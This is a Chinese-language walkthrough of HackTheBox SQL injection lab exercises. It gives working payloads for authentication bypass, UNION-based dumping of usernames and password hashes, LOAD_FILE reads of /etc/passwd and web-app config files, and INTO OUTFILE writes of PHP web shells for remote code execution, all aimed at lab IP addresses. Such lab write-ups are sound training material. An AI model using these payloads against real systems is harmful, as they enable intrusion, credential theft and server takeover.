我们来尝试向网站根目录写入一个文本文件，并验证我们是否拥有写入权限。以下查询应该会将内容写入`file written successfully!`该`/var/www/html/proof.txt`文件，之后我们就可以在 Web 应用程序中访问该文件了：


**注意：**要编写 Web Shell，我们必须知道 Web 服务器的基本 Web 目录（即 Web 根目录）。一种方法是读取`load_file`服务器配置

注入`UNION`的有效载荷如下：

```
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

## 编写 Web Shell

确认写入权限后，我们可以继续在网站根目录下写入一个 PHP Web Shell。我们可以编写以下 PHP Web Shell 代码，以便直接在后端服务器上执行命令：

`<?php system($_REQUEST[0]); ?>`

我们可以重用之前的`UNION`注入有效载荷，并将字符串更改为上述内容，文件名更改为`shell.php`

再次确认没有错误，这意味着文件写入可能成功。可以通过浏览到该`/shell.php`文件并执行带有`0`参数的命令来验证这一点，参数位于`?0=id`我们的 URL 中：

`http://SERVER_IP:PORT/shell.php?0=id`

![显示的文本：uid=33(www-data) gid=33(www-data) groups=33(www-data)](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_shell_exec_1.png)

命令的输出结果`id`证实我们已获得代码执行权限，并且正在以该`www-data`用户身份运行。

# 问题
##### 使用命令行通过 MySQL 客户端连接到数据库。使用“show databases;”命令列出数据库管理系统 (DBMS) 中的数据库。第一个数据库的名称是什么？

```
mysql -u root -ppassword -h 154.57.164.66 -P 32277 --ssl=0
```

由于一些比较先进的mysql客户端会默认尝试SSL/TLS，但是在这个环境中的数据库服务器不支持，需要`--ssl=0`,有的时候需要`--skip-ssl`,因为不同版本对参数的支持不同

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.310 sec)
```

##### “发展”部门的部门编号是多少？

```
use employees;
```

切换到这个数据库

```
show tables;
```

得到

```
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.877 sec)
```

然后

```
MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| d002    | Finance            |
| d003    | Human Resources    |
| d001    | Marketing          |
| d004    | Production         |
| d006    | Quality Management |
| d008    | Research           |
| d007    | Sales              |
+---------+--------------------+
9 rows in set (0.701 sec)
```

##### 名字以“Bar”开头，且于1990年1月1日入职的员工的姓氏是什么？

```
MariaDB [employees]> select * from employees where first_name like 'Bar%' order by hire_date DESC;
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
|  10395 | 1960-02-23 | Bartek     | Nastansky | F      | 1989-06-05 |
|  10601 | 1956-08-10 | Barton     | Soicher   | F      | 1986-02-21 |
+--------+------------+------------+-----------+--------+------------+
3 rows in set (0.639 sec)
```

##### 在“职称”表中，员工编号大于 10000 或职称不包含“工程师”的记录数是多少？

之前都是翻到输出结果最上面看字段太麻烦了，这次直接使用快捷方式.

```
MariaDB [employees]> select column_name from information_schema.columns where table_name='titles';
+-------------+
| column_name |
+-------------+
| emp_no      |
| title       |
| from_date   |
| to_date     |
+-------------+
4 rows in set (0.407 sec)
```

得到了我们想用的字段，那就直接筛选

```
MariaDB [employees]> select count(*) from titles where emp_no > 10000 and title <>  "Engineer";
+----------+
| count(*) |
+----------+
|      481 |
+----------+
1 row in set (0.916 sec)
```

不对，又看了下发现还有这种职称,类似的职称很多都是带有关键词的，所以重新匹配

```
Assistant Engineer
```

```
MariaDB [employees]> select count(*) from titles where emp_no > 10000 and title <>  "%Engineer";
+----------+
| count(*) |
+----------+
|      654 |
+----------+
1 row in set (0.542 sec)
```

##### 尝试以用户“tom”的身份登录。成功登录后，显示的标志值是什么？

万能密码绕过即可,brupsuite抓包放到重放器中，使用以下payload

```
username=tom&password=xxx' or '1'='1
```

即可成功登录，但是登录成功后页面提示我，匪夷所思

```
Login successful as user: admin
```

不对，不对，我特意看了htb的资料，特意提示我and的优先级要比or高那么注入语句是

```
WHERE username='tom'
AND password='xxx'
OR '1'='1'
```
这就导致先计算and，为假，再计算or，false or true = true，这才会导致登录用户为admin

那就用这个payload

```
username=tom' or '1'='1&password=xxx
```

或者

```
username=tom'#
```

应该也是可以的，这个优先级确实一直疏忽了

##### 使用 ID 为 5 的用户登录以获取 flag。

这一关提示我们sql语句为

```
WHERE (username='tom' and id > 1)
AND password='xxx'
```

所以payload为

```
username=111' or id=5)-- -&password=111
```

##### 使用“mysql”工具连接到上述MySQL服务器，并查找对“employees”表中的所有记录和“departments”表中的所有记录进行“Union”操作时返回的记录数。

既然是联合查询就要看看字段数是否一样

```
MariaDB [employees]> select column_name from information_schema.columns where table_name='employees';
+-------------+
| column_name |
+-------------+
| emp_no      |
| birth_date  |
| first_name  |
| last_name   |
| gender      |
| hire_date   |
+-------------+
6 rows in set (0.512 sec)
```

```
MariaDB [employees]> select column_name from information_schema.columns where table_name='departments';
+-------------+
| column_name |
+-------------+
| dept_no     |
| dept_name   |
+-------------+
2 rows in set (0.301 sec)
```

字段不一样，补全就行

```
MariaDB [employees]> select count(*) from (select * from employees union select dept_no,dept_name,1,2,3,4 from departments) as a;
+----------+
| count(*) |
+----------+
|      663 |
+----------+
1 row in set (0.331 sec)
```

##### 使用 Union 注入来获取 'user()' 的结果

判断列的数量

```
http://154.57.164.67:32256/search.php?port_code=1' order by 5-- -
```

判断回显

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,3,4-- -
```

开始注入

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,3,user()-- -
```

##### ilfreight 数据库中 users 表中存储的用户 newuser 的密码哈希值是多少？

判断数据库

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,3,database()-- -
```

判断表名

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,group_concat(table_name),database() from information_schema.tables where table_schema=database()-- -
```

判断字段

```
http://154.57.164.67:32256/search.php?port_code=-1' union select 1,2,group_concat(column_name),database() from information_schema.columns where table_name='users'-- -
```

获得密码

```
http://154.57.164.67:32256/search.php?port_code=-1' union select 1,2,3,group_concat(id,0x7e,username,0x7e,password) from users-- -
```

获得

```
1~admin~392037dbba51f692776d6cefb6dd546d,2~newuser~9da2c9bcdf39d8610954e0e11ea8f45f
```

##### 从上面的 PHP 代码可以看出，'$conn' 没有定义，因此必须使用 PHP 的 include 命令导入它。检查导入的页面以获取数据库密码。

看了一下应该是使用数据库的DBA权限include一个php文件，补全逻辑释放flag

验证身份

```
http://154.57.164.73:30775/search.php?port_code=1' union select 1,2,user,4 from mysql.user-- -
```

验证权限

```
http://154.57.164.73:30775/search.php?port_code=1' union select 1,2,user,super_priv from mysql.user where user='root'-- -
```

验证具体权限

```
http://154.57.164.73:30775/search.php?port_code=1' union select 1,grantee,privilege_type,4 from information_schema.user_privileges where grantee="'root'@'localhost'"-- -
```

导入原有php页面查看源代码

```
http://154.57.164.73:30775/search.php?port_code=1' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
导入config.php

```
http://154.57.164.73:30775/search.php?port_code=1' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

这样就成功了但是这里这个config是我推测出来的，如果想要得到的话我试试ffuf

```
ffuf -u http://154.57.164.73:30775/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
```

这个也就是config.php文件设置错误导致可以被访问惹的祸


> htb访问这关的时候需要使用https

##### 用户“admin”的密码哈希值是什么？

在登录页面没找到什么突破口但是有一个注册页面需要邀请码,绕过注册码


```
username=hacker&password=Test123%40&repeatPassword=Test123%40&invitationCode=aaaa-bbbb-1234' or '1'='1
```

这一步是在重放里完成的应该是实现了,重新发送显示这个应该没问题

```
HTTP/1.1 500 Internal Server Error
Server: nginx/1.22.1
Date: Tue, 16 Jun 2026 18:38:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 0
```

登录进去后是一个消息平台，有一个search功能，进行测试

```
https://154.57.164.77:31348/index.php?q=1') order by 4-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,4-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='Users'-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,group_concat(Username,0x7e,Password) from Users-- -&u=1
```

##### Web应用程序的根路径是什么？

使用wappalyzer探测服务器技术发现是nginx中间件，但是需要知道在什么系统上运行，先看看用户是什么

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,user()-- -&u=1
```

显示

```
chattr_dbUser@localhost
```

需要知道这个用户都有哪些权限

```
https://154.57.164.77:31348/index.php?q=1') union select 1,grantee,privilege_type,4 from information_schema.user_privileges where grantee="'chattr_dbUser'@'localhost'"-- -&u=1
```

可以读取文件，探测常用路径

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,load_file('/etc/passwd')-- -&u=1
```

输出成功是Linux系统，先看看secure_file_priv权限能不能支持待会传马，可以

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,variable_name,variable_value from information_schema.global_variables where variable_name='secure_file_priv'-- -&u=1
```


那就排查nginx中间件，一般位置在/etc/nginx/nginx.conf文件有配置信息

```
 include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*
```

既然这样就需要排查sites-enabled目录下的文件，利用brupsuite攻击模块爆破即可

```
default
```
读取

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,load_file('/etc/nginx/sites-enabled/default')-- -&u=1
```

得到

```
/var/www/chattr-prod
```

##### 实现远程代码执行，并将 /flag_XXXXXX.txt 的内容提交如下。

既然知道绝对路径就可以尝试写入webshell

```
https://154.57.164.77:31348/index.php?q=1') union select "","","",'<?php @eval($_REQUEST[cmd]);?>' into outfile '/var/www/chattr-prod/shell.php'-- -&u=1
```

连接蚁剑即可
